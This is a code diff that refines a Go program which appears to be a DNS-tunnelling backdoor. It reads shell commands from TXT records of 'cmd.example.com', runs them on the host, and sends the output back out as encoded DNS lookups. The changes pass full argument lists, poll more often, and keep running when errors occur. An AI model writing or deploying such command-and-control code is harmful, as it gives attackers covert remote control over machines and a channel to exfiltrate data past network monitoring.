@@ -25,14 +25,15 @@ func main() {
 		},
 	}
 	commandChan := make(chan string)
-	responseChan := make(chan *exec.Cmd)
+	responseChan := make(chan []byte)
 	go getCommand(r, commandChan)
 	go handleCommands(commandChan, responseChan)
 	returnResponses(r, responseChan)
 }
 
+//Contact the server and get commands
 func getCommand(r *net.Resolver, c chan string) {
-	for true {
+	for {
 		//get shell command using dns TXT record
 		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
 		if err != nil {
@@ -40,53 +41,61 @@ func getCommand(r *net.Resolver, c chan string) {
 			return
 		}
 		c <- data[0]
-		time.Sleep(2 * time.Second)
+		time.Sleep(1 * time.Second)
 	}
 }
 
-func handleCommands(commandChan chan string, responseChan chan *exec.Cmd) {
+//Pass command to the responChan after convertion into an executable command
+func handleCommands(commandChan chan string, responseChan chan []byte) {
 	fmt.Println("waiting for commands...")
-	for true {
-		response := <-commandChan
-		if response != "" {
-			fmt.Println("$ " + response)
-			command := strings.Split(response, " ")
-			responseChan <- execCommand(command)
+	for {
+		TXTResponse := <-commandChan
+		if TXTResponse != "" {
+			fmt.Println("$ " + TXTResponse)
+			var args []string
+			if strings.Contains(TXTResponse, " ") {
+				args = strings.Split(TXTResponse, " ")
+			} else {
+				args = append(args, TXTResponse)
+			}
+
+			cmd := createCommand(args)
+			//Exec command
+			stdout, err := cmd.Output()
+			if err != nil {
+				fmt.Println(err)
+			} else {
+				responseChan <- stdout
+			}
+
 		}
 	}
 }
 
-func execCommand(shellCommand []string) *exec.Cmd {
+//Converts the command into an executable command
+func createCommand(args []string) *exec.Cmd {
 	var cmd *exec.Cmd
-	if len(shellCommand) > 1 {
-		cmd = exec.Command(shellCommand[0], shellCommand[1])
+	if len(args) > 1 {
+		cmd = exec.Command(args[0], args[1:]...)
 
 	} else {
-		cmd = exec.Command(shellCommand[0])
+		cmd = exec.Command(args[0])
 	}
 
 	return cmd
 
 }
 
-func returnResponses(r *net.Resolver, c chan *exec.Cmd) {
+func returnResponses(r *net.Resolver, responseChan chan []byte) {
 	var packetNumber uint16 = 0
-	for true {
-		cmd := <-c
-		stdout, err := cmd.Output()
-
-		if err != nil {
-			log.Fatal(err)
-			return
-		}
-		requests := encodeDNSRequests(packetNumber, strings.Split(string(stdout), "\n"))
+	for {
+		cmdOutput := <-responseChan
+		//execute cmd and get output
+		requests := encodeDNSRequests(packetNumber, strings.Split(string(cmdOutput), "\n"))
 		packetNumber++
 		for i, request := range requests {
 			fmt.Println(i, " ", request)
-			_, err := r.LookupHost(context.Background(), request)
-			if err != nil {
-				fmt.Println(err)
-			}
+			r.LookupHost(context.Background(), request)
 		}
 	}
 }
